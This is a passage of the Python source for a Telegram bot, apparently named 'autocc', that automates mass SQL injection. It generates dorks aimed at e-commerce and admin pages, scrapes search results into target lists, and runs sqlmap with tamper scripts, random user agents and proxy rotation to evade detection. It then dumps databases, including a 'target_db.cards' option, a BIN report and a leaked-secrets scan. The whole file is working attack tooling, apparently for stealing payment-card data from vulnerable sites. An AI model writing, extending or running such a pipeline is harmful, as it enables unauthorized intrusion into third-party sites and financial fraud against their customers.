#!/usr/bin/env python3
"""autocc — reply-keyboard menus, file-driven pipeline. file in -> stage -> file out."""
import asyncio
import json
import os
import re
import signal
import subprocess
import sys
from pathlib import Path

from telegram import Update, ReplyKeyboardRemove, ReplyKeyboardMarkup
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes,
)

from modules.utils import load_config, setup_logger, ensure_dirs
from modules import ui

# sabhi known button labels — taaki pending-input state mein button dabane
# par button ka label galti se input text na ban jaye (wo bug fix)
KNOWN_BUTTONS = set()
for _n in dir(ui):
    _kb = getattr(ui, _n)
    if isinstance(_kb, ReplyKeyboardMarkup):
        for _row in _kb.keyboard:
            for _b in _row:
                KNOWN_BUTTONS.add(_b.text if hasattr(_b, "text") else str(_b))

CFG = load_config("config.yaml")
LOG = setup_logger(CFG["logging"]["level"], CFG["logging"]["file"])
ensure_dirs(CFG["paths"])
ALLOWED = set(CFG["telegram"]["allowed_chat_ids"])
PENDING = {}    # chat_id -> action dict
FILECACHE = {}  # chat_id -> {"dorks": path}
REMOVE_CANDIDATES = {}  # chat_id -> [Path, ...] (status -> delete flow)

RAW = Path(CFG["paths"]["raw"])
FINAL = Path(CFG["paths"]["final"])
DUMPS = Path(CFG["paths"]["dumps"])

MAX_SEND = 45 * 1024 * 1024  # telegram bot api file cap

CONFIG_PATH = Path("config.yaml")


def save_cfg():
    """persist in-memory CFG (sqli/proxy/api toggles) so main.py subprocesses see it."""
    import yaml
    try:
        disk = yaml.safe_load(CONFIG_PATH.read_text()) or {}
    except Exception:
        disk = {}
    for section in ("sqli", "proxies", "sqlmapapi"):
        if section in CFG:
            disk[section] = CFG[section]
    CONFIG_PATH.write_text(yaml.safe_dump(disk, sort_keys=False,
                                           allow_unicode=True))
    LOG.info("[bot] config.yaml persisted (sqli/proxies/sqlmapapi)")

# ─── /kill machinery ──────────────────────────────────────────────────
KILLFILE = RAW / ".kill"          # stage modules check this to stop early
RUNNING = {"kind": None,          # None | "sub" (main.py) | "parse" (in-process)
           "proc": None, "stage": "", "title": "", "killed": False}


def begin_stage(kind, stage, title):
    """mark a stage as running; clear any stale kill signal."""
    KILLFILE.unlink(missing_ok=True)
    RUNNING.update(kind=kind, proc=None, stage=stage, title=title,
                   killed=False)


def finish_stage():
    """mark stage done; return True if it was /kill'ed."""
    killed = RUNNING.get("killed", False)
    RUNNING.update(kind=None, proc=None, stage="", title="", killed=False)
    return killed


def _kill_proc_group(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        try:
            proc.terminate()
        except Exception:
            pass


# real-progress regexes: log line -> (done, total[, extra])
# sqli + livecheck (pre-filter) dono ke progress lines pakadta hai
SQLI_RE = re.compile(
    r"\[(?:sqli|livecheck)\] progress (\d+)/(\d+)(?: injectables=(\d+))?")


def ok(chat_id):
    return chat_id in ALLOWED


# ─── screen switcher ──────────────────────────────────────────────────
async def goto(update, screen_key: str, extra_text: str = None):
    """post a header in chat (optional) and switch reply keyboard."""
    header, kb = ui.get_screen(screen_key)
    text = extra_text or header
    await update.message.reply_text(
        text, reply_markup=kb, parse_mode="Markdown"
    )


async def post(update, text, kb=None):
    await update.message.reply_text(
        text, reply_markup=kb, parse_mode="Markdown"
    )


# ─── file helpers ─────────────────────────────────────────────────────
async def send_file(update, path, caption=None):
    """send a file as document. returns True if sent."""
    p = Path(path)
    chat = update.effective_chat.id
    if not p.exists() or p.stat().st_size == 0:
        await update.get_bot().send_message(
            chat_id=chat, text=f"⚠️ file nahi bani: `{p.name}`",
            parse_mode="Markdown")
        return False
    if p.stat().st_size > MAX_SEND:
        mb = p.stat().st_size // 1024 // 1024
        await update.get_bot().send_message(
            chat_id=chat,
            text=f"⚠️ `{p.name}` bahut badi hai ({mb} MB) — server pe hai.",
            parse_mode="Markdown")
        return False
    with open(p, "rb") as fh:
        await update.get_bot().send_document(
            chat_id=chat, document=fh, caption=caption or p.name)
    return True


async def ask_file(update, prompt, pending, kb):
    """ask user to send/forward a file, remember what it's for."""
    PENDING[update.effective_chat.id] = pending
    prompt = prompt + "\n\n📎 file bhejo _ya_ seedha text paste kar do 🙂"
    await post(update, prompt, kb)


async def save_upload(update, dest: Path):
    """download the sent document to dest."""
    doc = update.message.document
    tg_file = await doc.get_file()
    dest.parent.mkdir(parents=True, exist_ok=True)
    await tg_file.download_to_drive(str(dest))
    LOG.info(f"[bot] uploaded {doc.file_name} -> {dest} "
             f"({dest.stat().st_size} B)")
    return dest


# ─── pipeline exec ────────────────────────────────────────────────────
def pipeline(stage, target=None, file=None, mode=None):
    cmd = [sys.executable, "main.py", "--stage", stage]
    if target:
        cmd += ["-t", target]
    if file:
        cmd += ["-f", str(file)]
    if mode:
        cmd += ["--mode", mode]
    return cmd


async def run_stage_live(update, title: str, cmd: list,
                         next_screen: str = None,
                         tail_lines: int = 4,
                         stage: str = "",
                         progress_re=None):
    """
    run cmd as subprocess, post a progress message in chat,
    edit it live, then optionally switch keyboard to next_screen.
    progress_re: optional regex over log lines for REAL progress.
    returns (returncode, killed).
    """
    begin_stage("sub", stage, title)
    bot = update.get_bot()
    chat = update.effective_chat.id

    msg = await bot.send_message(
        chat_id=chat,
        text=f"*{title}*\n`{ui.bar(0)}`\nstarting `{' '.join(cmd)}`",
        parse_mode="Markdown",
    )

    log_file = Path(CFG["logging"]["file"])
    before = log_file.stat().st_size if log_file.exists() else 0

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL, text=True,
                            start_new_session=True)
    RUNNING["proc"] = proc

    pct = 0
    tail = ""
    detail = "starting…"
    try:
        while proc.poll() is None:
            await asyncio.sleep(3)
            try:
                with open(log_file, "r") as f:
                    f.seek(before)
                    chunk = f.read()
                lines = chunk.strip().splitlines()
                # poll spam ("-> running") hatao — live view mein kaam ki
                # lines (target, progress, eta) dikhengi
                live = [l for l in lines if "-> running" not in l]
                if live:
                    tail = "\n".join(live[-tail_lines:])
                if progress_re:
                    for line in reversed(lines[-60:]):
                        m = progress_re.search(line)
                        if m:
                            done, total = int(m.group(1)), int(m.group(2))
                            pct = int(done * 100 / total) if total else 0
                            detail = f"\ntarget {done}/{total}"
                            if len(m.groups()) >= 3 and m.group(3):
                                detail += f" • injectables: {m.group(3)}"
                            em = re.search(r"eta=([0-9hms]+)", line)
                            if em:
                                detail += f" • eta {em.group(1)}"
                            break
                    # abhi kaun sa target scan ho raha hai
                    for line in reversed(lines[-60:]):
                        dm = re.search(r"\[sqli\] ▶ \d+/\d+ (\S+)", line)
                        if dm:
                            detail += f"\n📍 {dm.group(1)}"
                            break
                    # no fake creep: pct stays until a REAL progress line lands
                else:
                    pct = min(pct + 7, 95)
            except Exception:
                pass
            try:
                await bot.edit_message_text(
                    chat_id=chat, message_id=msg.message_id,
                    text=f"*{title}*\n`{ui.bar(pct)}`{detail}\n```\n{tail}\n```",
                    parse_mode="Markdown",
                )
            except Exception:
                pass
    except asyncio.CancelledError:
        _kill_proc_group(proc)
        raise

    rc = proc.returncode
    killed = finish_stage()

    if killed:
        status = "⏹ roka gaya — jitna hua utna neeche ⬇️"
    else:
        status = "✅ done" if rc == 0 else f"❌ failed (rc={rc})"
    await bot.edit_message_text(
        chat_id=chat, message_id=msg.message_id,
        text=f"*{title}*\n`{ui.bar(100)}`\n{status}\n```\n{tail}\n```",
        parse_mode="Markdown",
    )

    if next_screen:
        await goto(update, next_screen)
    return rc, killed


# ─── /start ───────────────────────────────────────────────────────────
async def cmd_start(update, ctx):
    if not ok(update.effective_chat.id):
        return await update.message.reply_text("unauthorized.")
    await goto(update, "main")


# ─── /kill — roko, jitna hua utna bhejo ───────────────────────────────
async def cmd_kill(update, ctx):
    if not ok(update.effective_chat.id):
        return await update.message.reply_text("unauthorized.")
    if not RUNNING.get("kind"):
        return await update.message.reply_text("kuch chal nahi raha 🙂")
    KILLFILE.touch(exist_ok=True)
    RUNNING["killed"] = True
    title = RUNNING.get("title") or RUNNING.get("stage") or "stage"
    await update.message.reply_text(
        f"⏹ *{title}* rok raha hun…\njitna hua utna bhejta hun.",
        parse_mode="Markdown")
    proc = RUNNING.get("proc")
    if proc and proc.poll() is None:
        # pehle 10s: stage khud kill file dekh ke gracefully rukega
        for _ in range(10):
            await asyncio.sleep(1)
            if proc.poll() is not None:
                break
        if proc.poll() is None:
            _kill_proc_group(proc)
            for _ in range(8):
                await asyncio.sleep(1)
                if proc.poll() is not None:
                    break
        if proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                pass


# ─── dork jobs: label -> (method, output files) ───────────────────────
DORK_JOBS = {
    "🌐 Generic Dorks": ("generic", ["dorks_generic.txt"]),
    "💉 SQLi Dorks": ("sqli", ["dorks_sqli.txt"]),
    "📁 File Dorks": ("files", ["dorks_files.txt"]),
    "🧩 CMS Dorks": ("cms", ["dorks_cms.txt"]),
    "🌍 Country Dorks": ("country", ["dorks_country.txt"]),
    "⚠️ HQ Error Dorks": ("hq_error", ["dorks_hq_error.txt"]),
    "📂 Exposed Files": ("exposed", ["dorks_exposed.txt"]),
    "🛒 Ecom Dorks": ("ecom", ["dorks_ecom.txt"]),
    "🔐 Admin Panels": ("admin", ["dorks_admin.txt"]),
    "🌟 ALL Dorks Pro": ("all", ["dorks_generic.txt", "dorks_sqli.txt",
                                 "dorks_files.txt", "dorks_cms.txt",
                                 "dorks_country.txt", "dorks_hq_error.txt",
                                 "dorks_exposed.txt", "dorks_ecom.txt",
                                 "dorks_admin.txt"]),
}


# ─── text router (all reply-keyboard taps come here) ──────────────────
async def on_text(update, ctx):
    chat = update.effective_chat.id
    if not ok(chat):
        return await update.message.reply_text("unauthorized.")
    t = (update.message.text or "").strip()

    # bug fix: bot agar text-input ka wait kar raha tha (pending) aur user ne
    # beech mein koi button daba diya, to button ka label input mat banao —
    # pending cancel karke button wali action chalao. (jaise: "From Domain"
    # ke baad "From Dorks" dabane par pehle wo label hi domain ban gaya tha)
    if t in KNOWN_BUTTONS:
        PENDING.pop(chat, None)

    # ── pending input mode ──
    if chat in PENDING:
        p = PENDING[chat]
        if p.get("action") == "need_file":
            # text-paste input: file bhejna optional — seedha text bhi chalega
            # (KNOWN_BUTTONS pehle hi pop ho chuke hain, to ye asli input hai)
            p = PENDING.pop(chat)
            return await handle_text_input(update, p, t)
        p = PENDING.pop(chat)
        return await handle_pending(update, p, t)

    # ── NAV: back ──
    if t == "⬅️ Back":
        return await goto(update, "main")

    # ── REMOVE: dynamic file-delete taps (status screen) ──
    if t == "🗑 Remove ALL" and REMOVE_CANDIDATES.get(chat):
        return await do_remove_all(update)
    cands = REMOVE_CANDIDATES.get(chat)
    if cands and t in [p.name for p in cands]:
        return await do_remove_file(update, t)

    # ── MAIN MENU ──
    if t == "🔑 Generate Keywords":     return await goto(update, "kw")
    if t == "🎯 Generate Dorks":        return await goto(update, "dork")
    if t == "🌐 Parse Dorks → URLs":    return await goto(update, "parse")
    if t == "💉 SQLi Scanner":          return await goto(update, "sqli")
    if t == "📦 DB Dump":               return await goto(update, "dump")
    if t == "📄 Validate":              return await goto(update, "validate")
    if t == "🧹 Dedupe":                return await goto(update, "dedupe")
    if t == "📤 Output Files":          return await goto(update, "output")
    if t == "🚀 Full Auto Pipeline":    return await goto(update, "auto")
    if t == "📊 Status":                return await show_status(update)
    if t == "📥 Fetch Results":         return await goto(update, "fetch")
    if t == "🛠 Help":                  return await goto(update, "help")

    # ── KEYWORDS (text in -> file out) ──
    if t in ("🔑 100", "🔑 500", "🔑 1000", "🔑 5000", "🔑 10000"):
        count = int(t.split()[1])
        PENDING[chat] = {"action": "kw", "count": count}
        return await post(update, f"🔑 send base keyword (count={count})",
                          ui.KW)
    if t == "✏️ Custom Base":
        PENDING[chat] = {"action": "kw_custom"}
        return await post(update, "✏️ send `base count`", ui.KW)

    # ── DORKS (file in -> files out) ──
    if t in DORK_JOBS:
        return await ask_file(
            update,
            f"📎 *keywords* file bhejo\n"
            f"(keywords.txt forward kar do — phir `{t}` banenge)",
            {"action": "need_file", "for": "dorks", "kind": t},
            ui.DORK)

    # ── PARSE (file in -> files out) ──
    if t in ("🦆 DDGS only", "🔵 Bing only", "⚡ DDGS + Bing"):
        engine = {"🦆 DDGS only": "ddgs",
                  "🔵 Bing only": "bing",
                  "⚡ DDGS + Bing": "both"}[t]
        cached = FILECACHE.get(chat, {}).get("dorks")
        if cached and Path(cached).exists():
            return await do_parse(update, engine, str(cached))
        return await ask_file(
            update,
            "📎 *dork* file bhejo\n"
            "(dorks_*.txt forward kar do — phir parsing hogi)",
            {"action": "need_file", "for": "parse", "engine": engine},
            ui.PARSE)
    if t == "📂 Pick Dork File":
        return await ask_file(
            update,
            "📎 dork file bhejo — milte hi engine chunna",
            {"action": "need_file", "for": "parse_pick"},
            ui.PARSE)

    # ── SQLI (file in -> file out) ──
    if t == "🚀 Scan targets.txt":
        return await ask_file(
            update,
            "📎 *targets* file bhejo\n"
            "(targets.txt forward kar do — phir sqlmap scan)",
            {"action": "need_file", "for": "sqli"},
            ui.SQLI)
    if t == "📤 Upload Proxies":
        return await ask_file(
            update,
            "📎 *proxy* file bhejo\n"
            "(one per line: `host:port` ya `socks5://host:port` — "
            "`user:pass@host:port` bhi chalega)",
            {"action": "need_file", "for": "proxies"},
            ui.SQLI)
    if t.startswith("⚙️ Level "):
        lvl = int(t.split()[2])
        CFG["sqli"]["level"] = lvl
        save_cfg()
        return await post(update, f"⚙️ level = *{lvl}* ✅ saved", ui.SQLI)
    if t == "🎭 Tamper: ON" or t == "🎭 Tamper: OFF":
        CFG["sqli"]["tamper"] = ("" if CFG["sqli"]["tamper"]
                                 else "space2comment,between,randomcase")
        state = "ON" if CFG["sqli"]["tamper"] else "OFF"
        save_cfg()
        return await post(update, f"🎭 tamper = *{state}* ✅ saved", ui.SQLI)
    if t == "🕵️ UA: ON" or t == "🕵️ UA: OFF":
        CFG["sqli"]["random_agent"] = not CFG["sqli"]["random_agent"]
        state = "ON" if CFG["sqli"]["random_agent"] else "OFF"
        save_cfg()
        return await post(update, f"🕵️ random UA = *{state}* ✅ saved", ui.SQLI)
    if t == "🌐 Proxy: ON" or t == "🌐 Proxy: OFF":
        CFG.setdefault("proxies", {})["enabled"] = not CFG.get(
            "proxies", {}).get("enabled", False)
        state = "ON" if CFG["proxies"]["enabled"] else "OFF"
        save_cfg()
        return await post(update, f"🌐 proxy rotation = *{state}* ✅ saved",
                          ui.SQLI)
    if t == "🔌 API: ON" or t == "🔌 API: OFF":
        CFG.setdefault("sqlmapapi", {})["enabled"] = not CFG.get(
            "sqlmapapi", {}).get("enabled", False)
        state = "ON" if CFG["sqlmapapi"]["enabled"] else "OFF"
        save_cfg()
        return await post(update, f"🔌 sqlmap REST API = *{state}* ✅ saved",
                          ui.SQLI)

    # ── DUMP (file in -> files out) ──
    if t == "📦 Dump target_db.cards":
        return await ask_file(
            update,
            "📎 *injectable* file bhejo\n"
            "(injectable.txt forward kar do — phir dump hoga)",
            {"action": "need_file", "for": "dump", "mode": "dump"},
            ui.DUMP)
    if t == "📋 List DBs":
        return await ask_file(
            update, "📎 *injectable* file bhejo (list DBs ke liye)",
            {"action": "need_file", "for": "dump", "mode": "dbs"}, ui.DUMP)
    if t == "🗂 List Tables":
        return await ask_file(
            update, "📎 *injectable* file bhejo (list tables ke liye)",
            {"action": "need_file", "for": "dump", "mode": "tables"}, ui.DUMP)
    if t == "🕵 Secrets Scan":
        rc, killed = await run_stage_live(update, "🕵 secrets scan",
                                          pipeline("secrets"), None,
                                          stage="secrets")
        await send_file(update, RAW / "secrets_found.json",
                        "secrets_found.json ✅ — leaked keys/tokens report")
        return await goto(update, "dump")
    if t == "📊 Custom Table":
        PENDING[chat] = {"action": "dump_custom"}
        return await post(update, "📊 send `db table`", ui.DUMP)

    # ── VALIDATE / DEDUPE / OUTPUT (file in -> file out) ──
    if t == "✅ Run Validate":
        return await ask_file(
            update,
            "📎 *parsed* file bhejo\n"
            "(parsed.csv forward kar do — phir validate hoga)",
            {"action": "need_file", "for": "validate"},
            ui.VALIDATE)
    if t == "🧹 Run Dedupe":
        return await ask_file(
            update,
            "📎 *validated* file bhejo\n"
            "(validated.csv forward kar do — phir dedupe hoga)",
            {"action": "need_file", "for": "dedupe"},
            ui.DEDUPE)
    if t in ("📄 .txt", "📊 .csv", "🧾 .json", "📦 All Formats"):
        return await ask_file(
            update,
            "📎 *final* file bhejo\n"
            "(final.csv forward kar do — phir output banega)",
            {"action": "need_file", "for": "output", "fmt": t},
            ui.OUTPUT)

    # ── AUTO (text flows, unchanged) ──
    if t == "🎯 From Domain":
        PENDING[chat] = {"action": "auto_domain"}
        return await post(update, "🎯 send target domain", ui.AUTO)
    if t == "🌐 From Dorks":
        PENDING[chat] = {"action": "auto_dorks"}
        return await post(update, "🌐 send base keyword", ui.AUTO)
    if t == "🔗 From URL List":
        PENDING[chat] = {"action": "auto_urls"}
        return await post(update, "🔗 send URLs, one per line", ui.AUTO)

    # ── STATUS ──
    if t == "🔄 Refresh":
        return await show_status(update)
    if t == "📈 Full Report":
        return await show_full_status(update)
    if t == "🗑 Remove Files":
        return await ask_remove(update)

    # ── FETCH ──
    if t in ("📄 output.txt", "📊 output.csv", "🧾 output.json", "📦 Send All"):
        return await do_fetch(update, t)

    # ── HELP ──
    if t in ("🔑 Keywords", "🎯 Dorks", "🌐 Parser", "💉 SQLi",
             "📦 Dump", "✅ Validate", "🧹 Dedupe", "📤 Output"):
        return await post(update, HELP_TEXT[t], ui.HELP)

    # ── fallback ──
    return await goto(update, "main")


# ─── document handler (the file-driven core) ──────────────────────────
async def on_doc(update, ctx):
    chat = update.effective_chat.id
    if not ok(chat):
        return await update.message.reply_text("unauthorized.")
    doc = update.message.document
    if not doc:
        return

    p = PENDING.pop(chat, None)
    if not p or p.get("action") != "need_file":
        return await post(update,
            "pehle button dabao, phir file bhejo 🙂", ui.MAIN)

    return await handle_file(update, p, doc)


def _stage_dest(kind, fname):
    """where an uploaded/pasted input file lands for each stage."""
    if kind == "dorks":
        return RAW / "keywords.txt"
    if kind in ("parse", "parse_pick"):
        return RAW / fname
    if kind == "sqli":
        return RAW / "targets.txt"
    if kind == "dump":
        return RAW / "injectable.txt"
    if kind == "validate":
        return RAW / "parsed.csv"
    if kind == "dedupe":
        return RAW / "validated.csv"
    if kind == "output":
        return RAW / "final.csv"
    if kind == "proxies":
        return Path(CFG.get("proxies", {}).get("file", "./data/proxies.txt"))
    return RAW / fname


async def handle_file(update, p, doc):
    """route an uploaded file to its stage, then send output file(s)."""
    fname = doc.file_name or "upload.txt"
    dest = await save_upload(update, _stage_dest(p["for"], fname))
    return await dispatch_file(update, p, dest)


async def handle_text_input(update, p, text):
    """pasted text ko file bana ke stage chalao (file bhejna optional)."""
    dest = _stage_dest(p["for"], "pasted.txt")
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_text(text if text.endswith("\n") else text + "\n")
    n = len(text.splitlines())
    LOG.info(f"[bot] pasted text -> {dest} ({n} lines)")
    await post(update, f"📝 text mil gaya ({n} lines) — stage chala raha hun…")
    return await dispatch_file(update, p, dest)


async def dispatch_file(update, p, dest):
    """run the stage for an already-saved input file."""
    kind = p["for"]

    if kind == "dorks":
        await do_dorks_file(update, p["kind"], dest)
        return await goto(update, "dork")

    if kind == "parse":
        FILECACHE.setdefault(update.effective_chat.id, {})["dorks"] = str(dest)
        await do_parse(update, p["engine"], str(dest))
        return

    if kind == "parse_pick":
        FILECACHE.setdefault(update.effective_chat.id, {})["dorks"] = str(dest)
        return await post(update,
            f"✅ `{dest.name}` mil gayi — ab engine chuno:", ui.PARSE)

    if kind == "sqli":
        rc, killed = await run_stage_live(update, "💉 sqlmap scan",
                                          pipeline("sqli", file=dest), None,
                                          stage="sqli", progress_re=SQLI_RE)
        await send_sqli_results(update, killed)
        return await goto(update, "sqli")

    if kind == "proxies":
        lines = [l for l in dest.read_text(errors="ignore").splitlines()
                 if l.strip() and not l.strip().startswith("#")]
        await post(update,
                   f"✅ *{len(lines)}* proxies saved.\n"
                   "🌐 Proxy ON karo — pehle scan pe live test ho jayega.",
                   ui.SQLI)
        return await goto(update, "sqli")

    if kind == "dump":
        mode = p.get("mode", "dump")
        rc, killed = await run_stage_live(update, "📦 db dump",
                                          pipeline("dump", file=dest,
                                                   mode=mode), None,
                                          stage="dump")
        await send_dump_results(update, partial=killed, mode=mode)
        return await goto(update, "dump")

    if kind == "validate":
        rc, killed = await run_stage_live(update, "📄 validate",
                                          pipeline("validate", file=dest),
                                          None, stage="validate")
        note = ("⏹ roka gaya — partial validated.csv"
                if killed else
                "validated.csv ✅ — dedupe ke liye forward kar do")
        await send_file(update, RAW / "validated.csv", note)
        return await goto(update, "validate")

    if kind == "dedupe":
        rc, killed = await run_stage_live(update, "🧹 dedupe",
                                          pipeline("dedupe", file=dest),
                                          None, stage="dedupe")
        pnote = " ⏹ partial" if killed else " ✅"
        await send_file(update, RAW / "final.csv",
                        f"final.csv{pnote} — output ke liye forward kar do")
        await send_file(update, RAW / "bin_report.csv",
                        f"bin_report.csv{pnote}")
        return await goto(update, "dedupe")

    if kind == "output":
        rc, killed = await run_stage_live(update, "📤 output",
                                          pipeline("output", file=dest),
                                          None, stage="output")
        await send_output_files(update, p.get("fmt"), partial=killed)
        return await goto(update, "output")


# ─── stage implementations ────────────────────────────────────────────
async def do_dorks_file(update, label, kw_path):
    from modules.dorks import DorkGen
    kws = Path(kw_path).read_text().splitlines()
    kws = [k.strip() for k in kws if k.strip()]
    if not kws:
        return await post(update, "⚠️ keywords file khaali hai.", ui.DORK)
    method, files = DORK_JOBS[label]
    dg = DorkGen(CFG, LOG)
    if method == "all":
        dg.all(kws)
    elif method == "generic":
        dg.generic(kws)
    elif method == "sqli":
        dg.hq_sqli(kws)
    elif method == "files":
        dg.files()
    elif method == "cms":
        dg.cms(kws)
    elif method == "country":
        dg.country(kws)
    elif method == "hq_error":
        dg.hq_error(kws)
    elif method == "exposed":
        dg.exposed()
    elif method == "ecom":
        dg.ecom(kws)
    elif method == "admin":
        dg.admin(kws)
    await post(update, f"✅ dorks ban gaye (`{label}`) — file(s) aa rahi hain:")
    for f in files:
        await send_file(update, RAW / f,
                        f"{f} ✅ — parse ke liye forward kar do")


async def do_parse(update, engine, dork_file, end_screen="parse"):
    """parse with live progress; end_screen=None keeps caller in control."""
    from modules.parser import URLParser
    begin_stage("parse", "parse", f"parsing via {engine}")
    bot = update.get_bot()
    chat = update.effective_chat.id

    msg = await bot.send_message(
        chat_id=chat,
        text=f"🌐 *parsing via {engine}*\n`{ui.bar(0)}`",
        parse_mode="Markdown",
    )

    p = URLParser(CFG, LOG)

    def _run():
        urls = p.parse_dorks_file(dork_file, engine=engine)
        p.extract_param_urls(urls)
        return urls

    log_file = Path(CFG["logging"]["file"])
    prog_re = re.compile(r"\[parser\] progress (\d+)/(\d+)(?: urls=(\d+))?")
    task = asyncio.create_task(asyncio.to_thread(_run))
    pct = 0
    detail = "crawling..."
    while not task.done():
        await asyncio.sleep(5)
        try:
            tail = log_file.read_text(errors="ignore").splitlines()[-80:]
            for line in reversed(tail):
                m = prog_re.search(line)
                if m:
                    done, total = int(m.group(1)), int(m.group(2))
                    urls_n = m.group(3) or "?"
                    pct = int(done * 100 / total) if total else 0
                    detail = f"dork {done}/{total} • urls: {urls_n}"
                    break
        except Exception:
            pass
        try:
            await bot.edit_message_text(
                chat_id=chat, message_id=msg.message_id,
                text=f"🌐 *parsing via {engine}*\n`{ui.bar(pct)}`\n{detail}",
                parse_mode="Markdown",
            )
        except Exception:
            pass
    urls = await task
    killed = finish_stage()
    tail_note = "\n⏹ roka gaya — partial results ⬇️" if killed else ""
    await bot.edit_message_text(
        chat_id=chat, message_id=msg.message_id,
        text=f"🌐 *parsing via {engine}*\n`{ui.bar(100)}`\nurls: {len(urls)}{tail_note}",
        parse_mode="Markdown",
    )
    await send_file(update, RAW / "urls.txt",
                    "urls.txt" + (" ⏹ partial" if killed else " ✅"))
    await send_file(update, RAW / "targets.txt",
                    "targets.txt" + (" ⏹ partial — sqli ke liye forward kar do"
                                     if killed else
                                     " ✅ — sqli scan ke liye forward kar do"))
    if end_screen:
        return await goto(update, end_screen)
    return killed


async def send_dump_results(update, partial=False, mode="dump"):
    if mode in ("dbs", "tables"):
        fname = "dbs.txt" if mode == "dbs" else "tables.txt"
        note = ("⏹ roka gaya — partial " if partial else "✅ ") + fname
        return await send_file(update, RAW / fname, note)
    csvs = sorted(DUMPS.rglob("*.csv"),
                  key=lambda p: p.stat().st_mtime, reverse=True)[:5]
    if not csvs:
        msg = ("⏹ roka gaya — abhi tak koi dump csv nahi bana."
               if partial else
               "📦 dump complete — data/dumps/ mein dekho (csv nahi mila).")
        return await post(update, msg, ui.DUMP)
    head = (f"⏹ roka gaya — jitne bane ({len(csvs)} csv):"
            if partial else
            f"📦 dump complete — {len(csvs)} csv file(s):")
    await post(update, head)
    for c in csvs:
        await send_file(update, c, f"{c.name} {'⏹ partial' if partial else '✅'}")


def extract_partial_injectables():
    """/kill ke baad: jitne injectable mile —
    checkpoint + sqlmap_out + injectable.txt teeno ka union."""
    from modules.sqli import SQLiScanner
    found = set(SQLiScanner.collect_injectables(RAW / "sqlmap_out"))
    cp = RAW / ".sqli_checkpoint.json"
    if cp.exists():
        try:
            found |= set(json.loads(cp.read_text()).get("found", []))
        except Exception:
            pass
    it = RAW / "injectable.txt"
    if it.exists():
        try:
            found |= {l.strip() for l in it.read_text().splitlines()
                      if l.strip().startswith("http")}
        except Exception:
            pass
    if found:
        it.write_text("\n".join(sorted(found)))
        LOG.info(f"[bot] partial injectables: {len(found)}")
    return len(found)


async def send_sqli_results(update, killed):
    if killed:
        n = extract_partial_injectables()
        if n:
            await send_file(update, RAW / "injectable.txt",
                            f"⏹ roka gaya — {n} partial injectables ⬇️\n"
                            "dump ke liye forward kar do")
        else:
            await post(update,
                       "⏹ roka gaya — abhi tak koi injectable nahi mila.")
    else:
        await send_file(update, RAW / "injectable.txt",
                        "injectable.txt ✅ — dump ke liye forward kar do")


async def send_output_files(update, fmt_label, partial=False):
    base = FINAL / CFG["output"]["base_name"]
    if fmt_label == "📄 .txt":
        files = [base.with_suffix(".txt")]
    elif fmt_label == "📊 .csv":
        files = [base.with_suffix(".csv")]
    elif fmt_label == "🧾 .json":
        files = [base.with_suffix(".json")]
    else:
        files = [base.with_suffix(".txt"), base.with_suffix(".csv"),
                 base.with_suffix(".json")]
    tag = " ⏹ partial" if partial else " ✅"
    for f in files:
        await send_file(update, f, f"{f.name}{tag}")


# ─── text pending actions (keywords / auto) ───────────────────────────
async def handle_pending(update, p, text):
    chat = update.effective_chat.id
    action = p["action"]

    if action == "kw":
        base = text.split()[0]
        count = p["count"]
        from modules.keywords import KeywordGen
        kws = KeywordGen(CFG, LOG).generate(base, count)
        (RAW / "keywords.txt").write_text("\n".join(kws))
        await send_file(update, RAW / "keywords.txt",
                        f"keywords.txt — {len(kws)} ✅\n"
                        "dorks ke liye forward kar do")
        return await goto(update, "kw")

    if action == "kw_custom":
        parts = text.split()
        base = parts[0]
        count = int(parts[1]) if len(parts) > 1 else 1000
        from modules.keywords import KeywordGen
        kws = KeywordGen(CFG, LOG).generate(base, count)
        (RAW / "keywords.txt").write_text("\n".join(kws))
        await send_file(update, RAW / "keywords.txt",
                        f"keywords.txt — {len(kws)} ✅\n"
                        "dorks ke liye forward kar do")
        return await goto(update, "kw")

    if action == "dump_custom":
        parts = text.strip().split()
        return await post(update,
            f"custom dump `{parts}` — use sqlmap manually.", ui.DUMP)

    if action == "auto_domain":
        target = text.strip()
        await goto(update, "main", f"🚀 running full pipeline on `{target}`...")
        rc, killed = await run_stage_live(update, f"🚀 full: {target}",
                                          pipeline("all", target), "main",
                                          stage="all")
        return

    if action == "auto_dorks":
        base = text.strip()
        from modules.keywords import KeywordGen
        from modules.dorks import DorkGen
        kws = KeywordGen(CFG, LOG).generate(base, 100)
        (RAW / "keywords.txt").write_text("\n".join(kws))
        await send_file(update, RAW / "keywords.txt", "keywords.txt ✅")
        DorkGen(CFG, LOG).hq_sqli(kws)
        await send_file(update, RAW / "dorks_sqli.txt", "dorks_sqli.txt ✅")
        # parse via to_thread (event loop block nahi hoga — /kill chalega)
        auto_killed = await do_parse(update, "both",
                                     str(RAW / "dorks_sqli.txt"),
                                     end_screen=None)
        if auto_killed:
            return await goto(update, "main")
        await post(update, f"scan shuru...", ui.AUTO)
        rc, killed = await run_stage_live(update, "💉 sqlmap scan",
                                          pipeline("sqli",
                                                   file=RAW / "targets.txt"),
                                          None, stage="sqli",
                                          progress_re=SQLI_RE)
        await send_sqli_results(update, killed)
        if killed:
            return await goto(update, "main")
        rc, killed = await run_stage_live(update, "📦 db dump",
                                          pipeline("dump",
                                                   file=RAW / "injectable.txt"),
                                          "main", stage="dump")
        await send_dump_results(update, partial=killed)
        return

    if action == "auto_urls":
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        (RAW / "targets.txt").write_text("\n".join(lines))
        rc, killed = await run_stage_live(update, "💉 scan from url list",
                                          pipeline("sqli",
                                                   file=RAW / "targets.txt"),
                                          None, stage="sqli",
                                          progress_re=SQLI_RE)
        await send_sqli_results(update, killed)
        return await goto(update, "main")


# ─── status ───────────────────────────────────────────────────────────
def _status_row(path: Path, label=None):
    label = label or path.name
    if not path.exists():
        return f"❌ `{label}`"
    try:
        n = len(path.read_text(errors="ignore").splitlines())
    except Exception:
        n = 0
    sz = path.stat().st_size
    size = (f"{sz/1024/1024:.1f} MB" if sz >= 1024*1024
            else f"{sz//1024} KB" if sz >= 1024 else f"{sz} B")
    if n == 0 and sz == 0:
